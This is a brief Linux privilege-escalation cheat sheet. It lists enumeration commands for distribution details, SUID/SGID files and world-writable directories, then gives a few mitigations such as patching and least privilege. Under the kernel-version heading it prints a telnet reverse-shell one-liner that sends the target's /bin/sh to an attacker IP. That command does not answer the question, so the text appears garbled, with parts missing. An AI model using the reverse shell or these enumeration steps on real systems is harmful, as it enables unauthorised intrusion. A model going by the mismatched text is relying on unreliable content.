 [cheat sheet] Basic Linux Privilege Escalation



Enumeration is the key.
(Linux) privilege escalation is all about:

    Collect - Enumeration, more enumeration and some more enumeration.
    Process - Sort through data, analyse and prioritisation.
    Search - Know what to search for and where to find the exploit code.
    Adapt - Customize the exploit, so it fits. Not every exploit work for every system "out of the box".
    Try - Get ready for (lots of) trial and error.


Operating System
What's the distribution type? What version?
cat /etc/issue
cat /etc/*-release
  cat /etc/lsb-release
  cat /etc/redhat-release



What's the Kernel version? Is it 64-bit?

telnet [atackers ip] 44444 | /bin/sh | [local ip] 44445    # On the targets system. Use the attackers IP!



Is port forwarding possible? Redirect and interact with traffic from another view
# rinetd
# http://www.howtoforge.com/port-forwarding-with-rinetd-on-debian-etch

# fpipe

What "Advanced Linux File Permissions" are used? Sticky bits, SUID & GUID
find / -perm -1000 -type d 2>/dev/null    # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here
find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the  group, not the user who started it.
find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the  owner, not the user who started it.

find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    # Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)

#find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hideany errors (e.g. permission denied)
find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null



Where can written to and executed from? A few 'common' places: /tmp, /var/tmp, /dev/shm
find / -writable -type d 2>/dev/null     # world-writeable folders
find / -perm -222 -type d 2>/dev/null  # world-writeable folders
find / -perm -o+w -type d 2>/dev/null    # world-writeable folders

find / -perm -o+x -type d 2>/dev/null    # world-executable folders

find / \( -perm -o+w -perm -o+x \) -type d 2>/dev/null   # world-writeable & executable folders



Any "problem" files? Word-writeable, "nobody" files
find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   # world-writeable files
find /dir -xdev \( -nouser -o -nogroup \) -print   # Noowner files

Mitigations
Is any of the above information easy to find?
Try doing it!
Setup a cron job which automates script(s) and/or 3rd party products



Is the system fully patched? Kernel, operating system, all applications, their  plugins and web services
apt-get update && apt-get upgrade
yum update



Are services running with the minimum level of privileges required?
For example, do you need to run MySQL as root?
Scripts Can any of this be automated?!
